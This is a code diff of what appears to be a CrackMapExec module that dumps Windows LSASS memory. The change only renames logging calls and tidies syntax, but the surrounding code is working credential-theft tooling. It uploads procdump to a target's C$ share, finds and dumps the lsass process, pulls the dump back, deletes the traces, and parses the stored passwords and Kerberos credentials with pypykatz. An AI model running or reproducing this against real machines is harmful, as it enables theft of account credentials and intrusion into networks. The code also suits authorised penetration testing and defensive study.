@@ -5,9 +5,10 @@
 # thanks to pixis (@HackAndDo) for making it pretty l33t :)
 # v0.4
 
-from io import StringIO
 import base64
+
 from pypykatz.pypykatz import pypykatz
+
 
 class CMEModule:
 
@@ -18,12 +19,12 @@ class CMEModule:
     multiple_hosts = True
 
     def options(self, context, module_options):
-        '''
+        """
             TMP_DIR             Path where process dump should be saved on target system (default: C:\\Windows\\Temp\\)
             PROCDUMP_PATH       Path where procdump.exe is on your system (default: /tmp/), if changed embeded version will not be used
             PROCDUMP_EXE_NAME   Name of the procdump executable (default: procdump.exe), if changed embeded version will not be used
             DIR_RESULT          Location where the dmp are stored (default: DIR_RESULT = PROCDUMP_PATH)
-        '''
+        """
 
         self.tmp_dir = "C:\\Windows\\Temp\\"
         self.share = "C$"
@@ -54,21 +55,21 @@ class CMEModule:
             with open(self.procdump_path + self.procdump, 'wb') as procdump:
                 procdump.write(self.procdump_embeded)
     
-        context.log.info('Copy {} to {}'.format(self.procdump_path + self.procdump, self.tmp_dir))
+        context.log.display('Copy {} to {}'.format(self.procdump_path + self.procdump, self.tmp_dir))
         with open(self.procdump_path + self.procdump, 'rb') as procdump:
             try:
                 connection.conn.putFile(self.share, self.tmp_share + self.procdump, procdump.read)
                 context.log.success('Created file {} on the \\\\{}{}'.format(self.procdump, self.share, self.tmp_share))
             except Exception as e:
-              context.log.error('Error writing file to share {}: {}'.format(share, e))
+              context.log.fail('Error writing file to share {}: {}'.format(share, e))
     
         # get pid lsass
         command = 'tasklist /v /fo csv | findstr /i "lsass"'
-        context.log.info('Getting lsass PID {}'.format(command))
+        context.log.display('Getting lsass PID {}'.format(command))
         p = connection.execute(command, True)
         pid = p.split(',')[1][1:-1]
         command = self.tmp_dir + self.procdump + ' -accepteula -ma ' + pid + ' ' + self.tmp_dir + '%COMPUTERNAME%-%PROCESSOR_ARCHITECTURE%-%USERDOMAIN%.dmp'
-        context.log.info('Executing command {}'.format(command))
+        context.log.display('Executing command {}'.format(command))
         p = connection.execute(command, True)
         context.log.debug(p)
         dump = False
@@ -76,7 +77,7 @@ class CMEModule:
             context.log.success('Process lsass.exe was successfully dumped')
             dump = True
         else:
-            context.log.error('Process lsass.exe error un dump, try with verbose')
+            context.log.fail('Process lsass.exe error un dump, try with verbose')
         
         if dump:
             regex = r"([A-Za-z0-9-]*.dmp)"
@@ -85,29 +86,29 @@ class CMEModule:
             if matches:
                 machine_name = matches.group()
             else:
-                context.log.info("Error getting the lsass.dmp file name")
+                context.log.display("Error getting the lsass.dmp file name")
                 sys.exit(1)
 
-            context.log.info('Copy {} to host'.format(machine_name))
+            context.log.display('Copy {} to host'.format(machine_name))
 
             with open(self.dir_result + machine_name, 'wb+') as dump_file:
                 try:
                     connection.conn.getFile(self.share, self.tmp_share + machine_name, dump_file.write)
                     context.log.success('Dumpfile of lsass.exe was transferred to {}'.format(self.dir_result + machine_name))
                 except Exception as e:
-                    context.log.error('Error while get file: {}'.format(e))
+                    context.log.fail('Error while get file: {}'.format(e))
 
             try:
                 connection.conn.deleteFile(self.share, self.tmp_share + self.procdump)
                 context.log.success('Deleted procdump file on the {} share'.format(self.share))
             except Exception as e:
-                context.log.error('Error deleting procdump file on share {}: {}'.format(self.share, e))
+                context.log.fail('Error deleting procdump file on share {}: {}'.format(self.share, e))
             
             try:
                 connection.conn.deleteFile(self.share, self.tmp_share + machine_name)
                 context.log.success('Deleted lsass.dmp file on the {} share'.format(self.share))
             except Exception as e:
-                context.log.error('Error deleting lsass.dmp file on share {}: {}'.format(self.share, e))
+                context.log.fail('Error deleting lsass.dmp file on share {}: {}'.format(self.share, e))
             
             with open(self.dir_result + machine_name, 'rb') as dump:
                 try:
@@ -117,7 +118,7 @@ class CMEModule:
                         pypy_parse = pypykatz.parse_minidump_external(dump)
                     except Exception as e:
                         pypy_parse = None
-                        context.log.error(f'Error parsing minidump: {e}')
+                        context.log.fail(f'Error parsing minidump: {e}')
 
                     ssps = ['msv_creds', 'wdigest_creds', 'ssp_creds', 'livessp_creds', 'kerberos_creds', 'credman_creds',
                             'tspkg_creds']
@@ -140,4 +141,4 @@ class CMEModule:
                     if len(credz_bh) > 0:
                         add_user_bh(credz_bh, None, context.log, connection.config)
                 except Exception as e:
-                    context.log.error('Error openning dump file', str(e))
+                    context.log.fail('Error openning dump file', str(e))
